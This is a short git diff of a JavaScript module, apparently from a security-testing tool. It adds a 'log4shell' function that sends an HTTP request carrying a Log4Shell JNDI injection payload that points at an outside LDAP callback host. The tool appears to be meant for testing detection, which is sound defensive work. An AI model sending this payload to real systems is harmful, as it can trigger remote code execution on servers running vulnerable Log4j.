@@ -30,7 +30,6 @@ async function generic(targetURL){
    
 }
 
-
 async function attack_tools(targetURL){
 
     const spinner = ora('Running generic security scanning').start();
@@ -71,6 +70,20 @@ async function attack_tools(targetURL){
    
 }
 
+async function log4shell(targetURL){
 
+    const spinner = ora('Log4Shell attack on a Non-Vulnerable application').start();
 
-module.exports = { generic, attack_tools}
+    spinner.text = 'Sending log4shell attack...';
+    await http().get(targetURL, {
+        q: '${jndi:ldap://blablablablablablabla.oob.li/a=b}'
+    });
+    
+    spinner.stopAndPersist({
+                    symbol: logSymbols.success,
+                    text: 'Log4Shell attack on a Non-Vulnerable application - done',
+                });
+   
+}
+
+module.exports = { generic, attack_tools, log4shell}
